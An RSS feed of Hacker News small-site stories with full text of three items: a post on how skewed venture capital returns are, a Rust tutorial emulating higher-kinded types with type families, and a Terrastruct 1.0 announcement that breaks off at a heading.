<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 1]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 1. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Mon, 22 Feb 2021 04:36:03 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-1.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Mon, 22 Feb 2021 04:36:03 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[Venture Capital Returns Are More Skewed Than People Realize]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26202849">thread link</a>) | @mcenedella
<br/>
February 20, 2021 | https://timesofe.com/vc-fund-returns-are-more-skewed-than-you-think/ | <a href="https://web.archive.org/web/*/https://timesofe.com/vc-fund-returns-are-more-skewed-than-you-think/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <div>
                <div>
                    
                        
                        

                        
                        
                        
                        <div>
                            

                            <div>
                                <p><a href="http://www.kauffman.org/"><img src="https://timesofe.com/wp-content/uploads/2020/02/download.jpg" data-src="https://timesofe.com/wp-content/uploads/2020/02/download.jpg" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a></p>

<p><em>This post originally appeared on Seth‚Äôs blog.</em></p>



<p>Some of the most popular posts I‚Äôve written over the past couple of years were the two that focused on just how rare outsized returns for an individual deal are in venture capital. You can see the original posts <a rel="noreferrer noopener" href="https://sethlevine.com/archives/2014/08/venture-outcomes-are-even-more-skewed-than-you-think.html" target="_blank">here</a> and <a href="https://www.sethlevine.com/archives/2019/09/the-markets-are-great-but-venture-outcomes-havent-changed-much.html">here</a>. In those posts I was analyzing data from Correlation Ventures that showed just how skewed venture returns are, specifically that <strong>65% of investment rounds fail to return 1x capital and only 4% return greater than 10x capital</strong>.</p>



<div><figure><img src="https://timesofe.com/wp-content/uploads/2020/10/returns-1024x607.png" alt="" height="607" srcset="https://timesofe.com/wp-content/uploads/2020/10/returns-1024x607.png 1024w, https://timesofe.com/wp-content/uploads/2020/10/returns-300x178.png 300w, https://timesofe.com/wp-content/uploads/2020/10/returns-768x455.png 768w, https://timesofe.com/wp-content/uploads/2020/10/returns-750x445.png 750w, https://timesofe.com/wp-content/uploads/2020/10/returns-1140x676.png 1140w, https://timesofe.com/wp-content/uploads/2020/10/returns.png 1488w" sizes="(max-width: 1024px) 100vw, 1024px" data-srcset="https://timesofe.com/wp-content/uploads/2020/10/returns-1024x607.png 1024w, https://timesofe.com/wp-content/uploads/2020/10/returns-300x178.png 300w, https://timesofe.com/wp-content/uploads/2020/10/returns-768x455.png 768w, https://timesofe.com/wp-content/uploads/2020/10/returns-750x445.png 750w, https://timesofe.com/wp-content/uploads/2020/10/returns-1140x676.png 1140w, https://timesofe.com/wp-content/uploads/2020/10/returns.png 1488w" data-src="https://timesofe.com/wp-content/uploads/2020/10/returns-1024x607.png" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></figure></div>



<p>Ian Hathaway, who recently co-authored the second edition of <a rel="noreferrer noopener" href="https://www.amazon.com/Startup-Communities-Building-Entrepreneurial-Ecosystem/dp/1119617650/ref=asc_df_1119617650/?tag=hyprod-20&amp;linkCode=df0&amp;hvadid=459726176530&amp;hvpos=&amp;hvnetw=g&amp;hvrand=9536524533228269419&amp;hvpone=&amp;hvptwo=&amp;hvqmt=&amp;hvdev=c&amp;hvdvcmdl=&amp;hvlocint=&amp;hvlocphy=9001941&amp;hvtargid=pla-930155281111&amp;psc=1" target="_blank">Startup Communities</a> with my partner, Brad, sent me the chart below, which highlights how that translates to returns in venture capital as an asset class. I‚Äôve seen versions of this chart before, and while it‚Äôs not surprising it is always jarring to see it laid out like this. Specifically, the difference between the best performing and average performing firms are incredibly wide. Venture is a hits business and if you think about a typical venture fund of almost any size having somewhere between 25 ‚Äì 40 investments, the chances of any one of those investments being a true outlier and returning a multiple of the fund are quite small. In order to have a successful fund, it‚Äôs almost a requirement that you have an outlier return for at least one of your investments (see below the chart for the math).</p>



<div><figure><img src="https://timesofe.com/wp-content/uploads/2020/10/ex-43-1024x685-1.png" alt="Dispersion of Returns for Active Managers in Various Asset Classes" height="607" srcset="https://timesofe.com/wp-content/uploads/2020/10/ex-43-1024x685-1.png 1024w, https://timesofe.com/wp-content/uploads/2020/10/ex-43-1024x685-1-300x201.png 300w, https://timesofe.com/wp-content/uploads/2020/10/ex-43-1024x685-1-768x514.png 768w, https://timesofe.com/wp-content/uploads/2020/10/ex-43-1024x685-1-750x502.png 750w" sizes="(max-width: 1024px) 100vw, 1024px" data-srcset="https://timesofe.com/wp-content/uploads/2020/10/ex-43-1024x685-1.png 1024w, https://timesofe.com/wp-content/uploads/2020/10/ex-43-1024x685-1-300x201.png 300w, https://timesofe.com/wp-content/uploads/2020/10/ex-43-1024x685-1-768x514.png 768w, https://timesofe.com/wp-content/uploads/2020/10/ex-43-1024x685-1-750x502.png 750w" data-src="https://timesofe.com/wp-content/uploads/2020/10/ex-43-1024x685-1.png" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></figure></div>







<p>Some quick math highlights why this is the case. For example, assume a $100M fund with 30 investments. That‚Äôs a little over $3M per investment, and while there is some dispersion from the average across companies in a fund, it‚Äôs not a bad way to model it. But from the outcomes chart above (the first one) we know that on average only 1 (actually just fewer than 1) company in that group of 30 will return between 10x and 20x. And less than 1 will return 20x or greater (I‚Äôm using the company averages, the dollar averages are on a per round basis, which would make these numbers even worse). A 20x returner for a fund that on average invests $3-$3.5M in a company doesn‚Äôt return that fund. Taking the most aggressive end of these numbers would still only have this one company returning 70% of the fund‚Äôs capital. If you were going to have several of these, of course, that would work out for your fund. IRR will depend on the timing of cash flows but as a quick rule of thumb, venture funds look to return at least 3 times the invested capital ‚Äì after fees, so more like 3.5x on a gross basis. That‚Äôs pretty hard to do without a true outlier return (50x+) and/or consistency of 10x+ returns that is simply hard to generate. And here‚Äôs where the dispersion comes in. The best funds do have multiple companies that return in that range. Or higher. But that means the median fund doesn‚Äôt have any. And that is why the average venture fund isn‚Äôt actually a particularly good investment and also why so many venture funds fail to return capital.</p>



<p>I thought about this a couple of years ago when <a href="https://www.sethlevine.com/archives/2018/04/whats-the-optimal-portfolio-strategy-for-a-venture-fund.html">I wrote about the optimal venture fund strategy</a> and my conclusion was that venture firms should place more bets and have more exposure across a larger set of businesses. Obviously, those inside the industry argue that managers who are good at picking businesses would do better to own more of fewer businesses if they can show that they have the aptitude to invest in those that become true outliers. But given how rare they are, I wonder if that is arguably the optimal strategy. As David Cohen replied once years ago when I asked him what the key to being a successful venture capitalist was: ‚ÄúLuck‚Äù.</p>
<!-- AI CONTENT END 1 -->
                                
	                            
                                                                
                                                            </div>


                        </div>
	                    
	                    
                        <div>
	<div>
		<p><img src="https://secure.gravatar.com/avatar/aa7495010cfb1a1b949100e97e76f0b4?s=80&amp;d=mm&amp;r=g" width="80" height="80" alt="Seth Levine" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">		</p>
		<div>
			
			<p>
				Hi, I'm Seth Levine, a Boulder, CO based technology investor and managing director at Foundry Group. While I love technology I‚Äôm also a husband, father, avid cyclist, snowboarder and outdoors guy.			</p>

							
			
		</div>
	</div>
</div>
                                    </div>
            </div>
            
        </div></div>]]>
            </description>
            <link>https://timesofe.com/vc-fund-returns-are-more-skewed-than-you-think/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26202849</guid>
            <pubDate>Sat, 20 Feb 2021 09:12:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Generalizing over Generics in Rust (Part 1) ‚Äì a.k.a. Higher Kinded Types in Rust]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26202687">thread link</a>) | @lukastyrychtr
<br/>
February 20, 2021 | https://rustyyato.github.io/type/system,type/families/2021/02/15/Type-Families-1.html | <a href="https://web.archive.org/web/*/https://rustyyato.github.io/type/system,type/families/2021/02/15/Type-Families-1.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>Do you want to use Higher Kinded Types (<code>HKT</code>) in Rust? Are you tired of waiting for <code>GAT</code>? Well, this is the place to be.</p>

<p>It‚Äôs easiest to understand <code>HKT</code> by analogy. In programming we have many different tiers of abstractions. Starting at the bottom we have <code>term</code>s (aka values) like <code>0</code>, <code>true</code>, <code>"hello world!"</code>. If we want to work with a lot of <code>term</code>s that share a property, we use <code>type</code>s. For example, if we want to work with ‚Ä¶</p>

<ul>
  <li>32-bit integer, we use <code>i32</code></li>
  <li>utf-8 strings, we use <code>&amp;str</code> or <code>String</code></li>
</ul>

<p>We generally use snake case to refer to <code>term</code>s generically like <code>x</code>, <code>im_an_integer</code>, and <code>database_connection</code>. We use functions to operate on these generic values.</p>

<div><div><pre><code><span>fn</span> <span>add_one</span><span>(</span>
    <span>// a generic 32-bit integer</span>
    <span>x</span><span>:</span> <span>i32</span>
<span>)</span> <span>-&gt;</span> <span>i32</span> <span>{</span> <span>x</span> <span>+</span> <span>1</span> <span>}</span>
</code></pre></div></div>

<p>Moving up the abstraction tiers, we come to <code>type</code>s. For example: <code>String</code>, <code>i32</code>, or <code>bool</code>. If we want to work with a lot of <code>type</code>s that share a property, we use <code>trait</code>s and generics. For example, if we want to work with ‚Ä¶</p>

<ul>
  <li>types that can be debug printed, we use <code>std::fmt::Debug</code></li>
  <li>types that can be iterated, we use <code>Iterator</code></li>
</ul>

<p>We generally use pascal case to refer to <code>types</code>s generically like <code>T</code>, <code>Self</code>, and <code>This</code>. We use generic functions to work with these generic types.</p>

<div><div><pre><code><span>fn</span> <span>print</span><span>&lt;</span><span>T</span><span>:</span> <span>Debug</span><span>&gt;</span><span>(</span><span>x</span><span>:</span> <span>T</span><span>)</span> <span>{</span>
    <span>println!</span><span>(</span><span>"{:?}"</span><span>,</span> <span>x</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>Moving up the abstraction tiers again, we come to <code>kind</code>s. For example: <code>Option</code>, <code>Result</code>, or <code>Vec</code>. Wait what. Let‚Äôs take a step back. Before I mentioned that <code>String</code>, <code>i32</code>, and <code>bool</code> are types. We also have more types that we can use, generic types like <code>Option&lt;i32&gt;</code> or <code>Result&lt;String, String&gt;</code>. What if you want to generalize over these types? Something of the form <code>T&lt;U&gt;</code>. That‚Äôs where we get to kinds. For example:</p>

<ul>
  <li><code>i32</code> has the kind <code>Type</code></li>
  <li><code>Option&lt;i32&gt;</code> has the kind <code>Type</code></li>
  <li><code>'a</code> has the kind <code>Lifetime</code></li>
  <li><code>Option</code> has the kind <code>Type -&gt; Type</code>
    <ul>
      <li>W H A T, let‚Äôs stop and explain what‚Äôs going on here</li>
    </ul>
  </li>
</ul>

<p>Generic types can be represented as a function from kinds to kinds. For example, <code>Option</code> is a function that takes a <code>Type</code> and produces a <code>Type</code> (hence <code>Type -&gt; Type</code>). Let‚Äôs see some more examples:</p>

<ul>
  <li><code>Result</code> has the kind <code>Type -&gt; Type -&gt; Type</code>
    <ul>
      <li>I‚Äôll use this notation because that‚Äôs how it‚Äôs done in the literature</li>
      <li>Note: this is equivalent to <code>(Type, Type) -&gt; Type</code> (you can always transform a function that take a tuple of arguments into one that takes multiple arguments, and vice versa)</li>
    </ul>
  </li>
  <li>references have a kind <code>Lifetime -&gt; Type -&gt; Type</code>
    <ul>
      <li><code>&amp;'a T</code>, one lifetime and one type parameter :)</li>
    </ul>
  </li>
  <li>arrays have the kind <code>Type -&gt; usize -&gt; Type</code>
    <ul>
      <li><code>[T; len]</code>, one type and one <code>usize</code> <code>term</code> (getting close to dependent types, something we won‚Äôt touch in this post)</li>
    </ul>
  </li>
</ul>

<p>With this notion of <code>kind</code>s we are now well equipped to generalize over generics. Just one cinch, <code>Rust</code> doesn‚Äôt know about <code>kind</code>s! So how do we generalize over generics if we can‚Äôt even express the fundamental building blocks.</p>



<p>The key insight is that we can represent <code>kind</code>s as a system of types and traits. For example, here‚Äôs how to handle <code>Type -&gt; Type</code> kinds.</p>

<p>Note: I‚Äôll show how <code>Option</code> fits in, and introduce <code>Result&lt;_, E&gt;</code>, but I‚Äôll leave the implementation of <code>Vec</code> to you. It‚Äôs an interesting puzzle if you are inclined</p>

<div><div><pre><code><span>// `Option` has the kind `Type -&gt; Type`,</span>
<span>// we'll represent it with `OptionFamily`</span>
<span>struct</span> <span>OptionFamily</span><span>;</span>
<span>// `Result` has the kind `Type -&gt; Type -&gt; Type`,</span>
<span>// so we fill in one of the types with a concrete one</span>
<span>struct</span> <span>ResultFamily</span><span>&lt;</span><span>E</span><span>&gt;</span><span>(</span><span>PhantomData</span><span>&lt;</span><span>E</span><span>&gt;</span><span>);</span>

<span>// I'll leave the implementation of `VecFamily` to you</span>

<span>// This trait represents the `kind` `Type -&gt; Type`</span>
<span>pub</span> <span>trait</span> <span>OneTypeParam</span><span>&lt;</span><span>A</span><span>&gt;</span> <span>{</span>
    <span>// This represents the output of the function `Type -&gt; Type`</span>
    <span>// for a specific argument `A`.</span>
    <span>type</span> <span>This</span><span>;</span>
<span>}</span>

<span>impl</span><span>&lt;</span><span>A</span><span>&gt;</span> <span>OneTypeParam</span><span>&lt;</span><span>A</span><span>&gt;</span> <span>for</span> <span>OptionFamily</span> <span>{</span>
    <span>// `OptionFamily` represents `Type -&gt; Type`,</span>
    <span>// so filling in the first argument means</span>
    <span>// `Option&lt;A&gt;`</span>
    <span>type</span> <span>This</span> <span>=</span> <span>Option</span><span>&lt;</span><span>A</span><span>&gt;</span><span>;</span>
<span>}</span>

<span>impl</span><span>&lt;</span><span>A</span><span>,</span> <span>E</span><span>&gt;</span> <span>OneTypeParam</span><span>&lt;</span><span>A</span><span>&gt;</span> <span>for</span> <span>ResultFamily</span><span>&lt;</span><span>E</span><span>&gt;</span> <span>{</span>
    <span>// note how all results in this family have `E` as the error type</span>
    <span>// This is similar to how currying works in functional languages</span>
    <span>type</span> <span>This</span> <span>=</span> <span>Result</span><span>&lt;</span><span>A</span><span>,</span> <span>E</span><span>&gt;</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>Note how a <code>trait</code> can act as a function over types, so you can encode the idea <code>Type -&gt; Type</code> using a trait!</p>

<p>Let‚Äôs also introduce a type alias for ease of use.</p>

<div><div><pre><code><span>// Option&lt;A&gt; == This&lt;OptionFamily, A&gt;</span>
<span>pub</span> <span>type</span> <span>This</span><span>&lt;</span><span>T</span><span>,</span> <span>A</span><span>&gt;</span> <span>=</span> <span>&lt;</span><span>T</span> <span>as</span> <span>OneTypeParam</span><span>&lt;</span><span>A</span><span>&gt;&gt;</span><span>::</span><span>This</span><span>;</span>
</code></pre></div></div>

<p>Now we can replace all usage of <code>Option</code>, <code>Result&lt;_, E&gt;</code> with <code>OptionFamily</code> or <code>ResultFamily&lt;E&gt;</code>! From this we can build up abstractions that ‚Äúrequire‚Äù HKT. Let‚Äôs start with the simplest abstraction <code>Functor</code>. This is just any <code>Type -&gt; Type</code> that has a notion of mapping a value. Generally <code>Functor</code> represents a collection, but it can do much more than that (But I won‚Äôt dive into <code>Functor</code> in particular in this post).</p>

<div><div><pre><code><span>trait</span> <span>Functor</span><span>&lt;</span><span>A</span><span>,</span> <span>B</span><span>&gt;</span><span>:</span> <span>OneTypeParam</span><span>&lt;</span><span>A</span><span>&gt;</span> <span>+</span> <span>OneTypeParam</span><span>&lt;</span><span>B</span><span>&gt;</span> <span>{</span>
    <span>fn</span> <span>map</span><span>&lt;</span><span>F</span><span>&gt;</span><span>(</span><span>self</span><span>,</span> <span>this</span><span>:</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>A</span><span>&gt;</span><span>,</span> <span>f</span><span>:</span> <span>F</span><span>)</span> <span>-&gt;</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>B</span><span>&gt;</span>
    <span>where</span>
        <span>F</span><span>:</span> <span>Fn</span><span>(</span><span>A</span><span>)</span> <span>-&gt;</span> <span>B</span> <span>+</span> <span>Copy</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>This is quite a lot, so let‚Äôs soak it in.</p>

<div><div><pre><code><span>OneTypeParam</span><span>&lt;</span><span>A</span><span>&gt;</span> <span>+</span> <span>OneTypeParam</span><span>&lt;</span><span>B</span><span>&gt;</span>
</code></pre></div></div>

<p>First, we require that our families can be used with either type. This allows you to restrict the families in some ways, for example for <code>HashSet</code>, only allow <code>T: Hash + Eq</code>. <code>A</code> will be the input type, and <code>B</code> will be the output type.</p>

<div><div><pre><code><span>fn</span> <span>map</span><span>&lt;</span><span>F</span><span>&gt;</span><span>(</span><span>self</span><span>,</span> <span>this</span><span>:</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>A</span><span>&gt;</span><span>,</span> <span>f</span><span>:</span> <span>F</span><span>)</span> <span>-&gt;</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>B</span><span>&gt;</span>
<span>where</span>
    <span>F</span><span>:</span> <span>Fn</span><span>(</span><span>A</span><span>)</span> <span>-&gt;</span> <span>B</span> <span>+</span> <span>Copy</span><span>;</span>
</code></pre></div></div>

<p>Next we have this monstrous function! This will be easier to explain if we have a concrete family.</p>

<div><div><pre><code><span>/// for `OptionFamily`</span>
<span>fn</span> <span>map</span><span>&lt;</span><span>F</span><span>&gt;</span><span>(</span><span>self</span><span>,</span> <span>this</span><span>:</span> <span>Option</span><span>&lt;</span><span>A</span><span>&gt;</span><span>,</span> <span>f</span><span>:</span> <span>F</span><span>)</span> <span>-&gt;</span> <span>Option</span><span>&lt;</span><span>B</span><span>&gt;</span>
<span>where</span>
    <span>F</span><span>:</span> <span>Fn</span><span>(</span><span>A</span><span>)</span> <span>-&gt;</span> <span>B</span> <span>+</span> <span>Copy</span><span>;</span>
</code></pre></div></div>

<p>So this is just the same as the ordinary map in <code>Option</code>, except it requires <code>Fn</code>, instead of <code>FnOnce</code>. We could generalize over <code>Fn</code> and <code>FnOnce</code> if Rust had associated traits, but alas we don‚Äôt, so we‚Äôll have to make do with <code>Fn</code> (I‚Äôll leave it to you to figure out a nice way to abstract over <code>Fn</code>, <code>FnMut</code> and <code>FnOnce</code>). All we‚Äôve done is generalize it to <em>any</em> family, not just <code>Option</code>.</p>

<p>The <code>Copy</code> bound is nice for things like <code>Vec</code> where you need to apply the function multiple times. You can convert any <code>Fn</code> to a <code>Fn + Copy</code> because <code>&amp;_</code> implement <code>Fn</code> and are <code>Copy</code>.</p>

<p>So all together again:</p>

<div><div><pre><code><span>trait</span> <span>Functor</span><span>&lt;</span><span>A</span><span>,</span> <span>B</span><span>&gt;</span><span>:</span> <span>OneTypeParam</span><span>&lt;</span><span>A</span><span>&gt;</span> <span>+</span> <span>OneTypeParam</span><span>&lt;</span><span>B</span><span>&gt;</span> <span>{</span>
    <span>fn</span> <span>map</span><span>&lt;</span><span>F</span><span>&gt;</span><span>(</span><span>self</span><span>,</span> <span>this</span><span>:</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>A</span><span>&gt;</span><span>,</span> <span>f</span><span>:</span> <span>F</span><span>)</span> <span>-&gt;</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>B</span><span>&gt;</span>
    <span>where</span>
        <span>F</span><span>:</span> <span>Fn</span><span>(</span><span>A</span><span>)</span> <span>-&gt;</span> <span>B</span> <span>+</span> <span>Copy</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p><code>Functor</code> just specifies a mapping operation. We can implement this rather easily.</p>

<div><div><pre><code><span>impl</span><span>&lt;</span><span>A</span><span>,</span> <span>B</span><span>&gt;</span> <span>Functor</span><span>&lt;</span><span>A</span><span>,</span> <span>B</span><span>&gt;</span> <span>for</span> <span>OptionFamily</span> <span>{</span>
    <span>fn</span> <span>map</span><span>&lt;</span><span>F</span><span>&gt;</span><span>(</span><span>self</span><span>,</span> <span>this</span><span>:</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>A</span><span>&gt;</span><span>,</span> <span>f</span><span>:</span> <span>F</span><span>)</span> <span>-&gt;</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>B</span><span>&gt;</span>
    <span>where</span>
        <span>F</span><span>:</span> <span>Fn</span><span>(</span><span>A</span><span>)</span> <span>-&gt;</span> <span>B</span> <span>+</span> <span>Copy</span> <span>{</span>
        <span>// I'm not cheating!</span>
        <span>this</span><span>.map</span><span>(</span><span>f</span><span>)</span>
    <span>}</span>
<span>}</span>

<span>// try out `VecFamily`, it doesn't need to be optimal, it just needs to work!</span>
</code></pre></div></div>

<p>Ok, but that‚Äôs boring, I hear you say. What about <code>Monad</code>? Typically it‚Äôs defined by it‚Äôs <code>bind</code> operation (We‚Äôll skip <code>Applicative</code> here, try it out yourself!). I‚Äôm not going to explain how <code>Monad</code> works, or why you would want it, just how to implement it.</p>

<div><div><pre><code><span>trait</span> <span>Monad</span><span>&lt;</span><span>A</span><span>,</span> <span>B</span><span>&gt;</span><span>:</span> <span>Functor</span><span>&lt;</span><span>A</span><span>,</span> <span>B</span><span>&gt;</span> <span>{</span>
    <span>fn</span> <span>bind</span><span>&lt;</span><span>F</span><span>&gt;</span><span>(</span><span>self</span><span>,</span> <span>a</span><span>:</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>A</span><span>&gt;</span><span>,</span> <span>f</span><span>:</span> <span>F</span><span>)</span> <span>-&gt;</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>B</span><span>&gt;</span>
    <span>where</span>
        <span>F</span><span>:</span> <span>Fn</span><span>(</span><span>A</span><span>)</span> <span>-&gt;</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>B</span><span>&gt;</span> <span>+</span> <span>Copy</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>Looks the same as <code>Functor</code> to me! ‚Ä¶ Wait, the bound on <code>F</code> looks funky. Let‚Äôs dig in to the <code>OptionFamily</code> implementation again, maybe that will clear things up.</p>

<div><div><pre><code><span>/// for `OptionFamily`</span>
<span>fn</span> <span>bind</span><span>&lt;</span><span>F</span><span>&gt;</span><span>(</span><span>self</span><span>,</span> <span>a</span><span>:</span> <span>Option</span><span>&lt;</span><span>A</span><span>&gt;</span><span>,</span> <span>f</span><span>:</span> <span>F</span><span>)</span> <span>-&gt;</span> <span>Option</span><span>&lt;</span><span>B</span><span>&gt;</span>
<span>where</span>
    <span>F</span><span>:</span> <span>Fn</span><span>(</span><span>A</span><span>)</span> <span>-&gt;</span> <span>Option</span><span>&lt;</span><span>B</span><span>&gt;</span> <span>+</span> <span>Copy</span><span>;</span>
</code></pre></div></div>

<p>This looks very familiar, ‚Ä¶ where have I seen this before? <code>Option::and_then</code> is that you?</p>

<div><div><pre><code><span>impl</span><span>&lt;</span><span>A</span><span>,</span> <span>B</span><span>&gt;</span> <span>Monad</span><span>&lt;</span><span>A</span><span>,</span> <span>B</span><span>&gt;</span> <span>for</span> <span>OptionFamily</span> <span>{</span>
    <span>fn</span> <span>bind</span><span>&lt;</span><span>F</span><span>&gt;</span><span>(</span><span>self</span><span>,</span> <span>this</span><span>:</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>A</span><span>&gt;</span><span>,</span> <span>f</span><span>:</span> <span>F</span><span>)</span> <span>-&gt;</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>B</span><span>&gt;</span>
    <span>where</span>
        <span>F</span><span>:</span> <span>Fn</span><span>(</span><span>A</span><span>)</span> <span>-&gt;</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>B</span><span>&gt;</span> <span>+</span> <span>Copy</span> <span>{</span>
        <span>// It fits üòâ</span>
        <span>this</span><span>.and_then</span><span>(</span><span>f</span><span>)</span>
    <span>}</span>
<span>}</span>

<span>// try out `VecFamily`, it doesn't need to be optimal, it just needs to work!</span>
</code></pre></div></div>

<p>In this way you can implement most, if not all <code>HKT</code> abstractions in stable Rust. However the ergonomics of these abstractions are downright abysmal. Bounds, bounds, bounds <em>everywhere</em>. We saw this a little in <code>Functor&lt;A, B&gt;</code>, we needed <code>OneTypeParam&lt;A&gt; + OneTypeParam&lt;B&gt;</code> (why does family need to be repeated!). Hopefully we can solve this on nightly, find out next time ‚Ä¶</p>

<p>If you can‚Äôt wait and must know more, check out <a href="https://github.com/rustyyato/type-families"><code>type-families</code></a>, an experimental crate that implements the ideas outlined in this blog post.</p>

<p>You can discuss this on reddit <a href="https://www.reddit.com/r/rust/comments/ll9un4/generalizing_over_generics_in_rust_part_1_aka/">here</a> or the users.rust-lang.org <a href="https://users.rust-lang.org/t/generalizing-over-generics-in-rust-part-1-aka-higher-kinded-types-in-rust/55716/2">here</a></p>

<p>Credits:</p>

<p>Thanks /u/CalligrapherMinute77 for requesting this post
Thanks /u/IshKebab for helping me reword the introduction to make things more clear</p>

  </div>
</article>

      </div>
    </div></div>]]>
            </description>
            <link>https://rustyyato.github.io/type/system,type/families/2021/02/15/Type-Families-1.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26202687</guid>
            <pubDate>Sat, 20 Feb 2021 08:45:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Terrastruct Is 1.0]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26202596">thread link</a>) | @alixanderwang
<br/>
February 20, 2021 | https://terrastruct.com/blog/terrastruct-is-1-point-0/ | <a href="https://web.archive.org/web/*/https://terrastruct.com/blog/terrastruct-is-1-point-0/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
  <div>
    
    
    <div>
      <p>Terrastruct launched on January 5, 2020 [0] to address a hole in developer tools ‚Äì a diagramming tool that was made for developers. The popular choice to create software architecture diagrams is with general-purpose tools. The problem is that often, when trying to map this intricate, layered model of the architecture that engineers have in their heads to a static image, it gets very messy, unsuitable as documentation or even presentation. The alternative is that they try to keep it clean by removing critical details and cutting non-essential edge case flows. But the details and handling edge cases are the core of what an architecture is meant to convey.</p>

<p>Instead, Terrastruct is designed to handle complexity by breaking a diagram apart. Each layer maps to layers of abstractions, and there‚Äôs room to define individual scenarios to describe every sequence of events or edge cases as needed. The tooling makes it easy to create these sorts of diagrams, and the presentation has intuitive navigation to view them. [1]</p>

<p>Now, after a year of iterating from the initial launch, Terrastruct is now ‚Äú1.0‚Äù. It‚Äôs stable, and people <em>enjoy</em> diagramming on it. Hundreds of software architecture diagrams are created and shared every week, by individual developers, teams, and organizations. And they‚Äôre diagrams that are only possible on Terrastruct.</p>

<div>
	<picture>
		<source srcset="https://terrastruct.com/assets/images/onepointoh.webp" type="image/webp">
		<img src="https://terrastruct.com/assets/images/onepointoh.png" alt="Terrastruct 1.0 UI">
	</picture>
</div>
<h2 id="notable-changelog-since-launch">Notable changelog since launch</h2>
<ul>
  <li>Complete redesign of the UI</li>
  <li>Undo/redo</li>
  <li>Autosave</li>
  <li>Autolayout</li>
  <li>Full set of flowchart shapes</li>
  <li>Full set of connectors</li>
  <li>Automatic connection pathing</li>
  <li>Syncing to a Github repository</li>
  <li>Hand-drawn mode</li>
  <li>Hundreds of hand-picked icons suited for software diagrams</li>
  <li>Live collaboration</li>
  <li>Granular permissioning</li>
  <li>Password-protection for shareable diagrams</li>
  <li>Google image search in-app</li>
  <li>Upload images</li>
  <li>Templates</li>
  <li>Comments</li>
  <li>Dark mode</li>
  <li>Full coverage of standard diagramming features (snap alignments, distribute spacing, etc)</li>
  <li>Special elements for defining database tables and classes</li>
  <li>Code snippets</li>
  <li>Keyboard shortcuts</li>
</ul>

<h2 id="whats-next-for-20">What‚Äôs next for 2.0</h2>
<p>The next big initiatives:</p>
<ol>
  <li>Adding a data layer, and feed real data directly into diagrams</li>
  <li>Intelligently generate diagrams where possible</li>
</ol>

<h3 id="data-in-diagrams">Data in diagrams</h3>
<p>The idea here is that one of the main use cases for diagrams is documenting systems. But a static snapshot of systems is too detached from the actual, and is likely to drift as updates are made to the system. Finding areas where real data can be used integrates the diagram as part of your infrastructure, or at least an artifact of it.</p>

<p>This also essentially lets engineers <em>design</em> the layout of their analytics/metrics. Instead of using charts in a grid, the spatial orientation of elements with labels and shapes and colors gives context to the data.</p>

<p>For example, a server‚Äôs color reflects the reading of its last health check. A connection label gives the reading of current pending requests for each service. CPU readings are shown for each one of your servers. With Terrastruct‚Äôs layers, if you see a spike in CPU on a server, you can sleuth in a much more intuitive manner by clicking through into that server‚Äôs layout, and the readings of various processes.</p>

<div>
	<picture>
		<source srcset="https://terrastruct.com/assets/images/dashboard_example.webp" type="image/webp">
		<img src="https://terrastruct.com/assets/images/dashboard_example.png" alt="Metrics dashboard example">
	</picture>
</div>

<h3 id="intelligent-generation">Intelligent generation</h3>
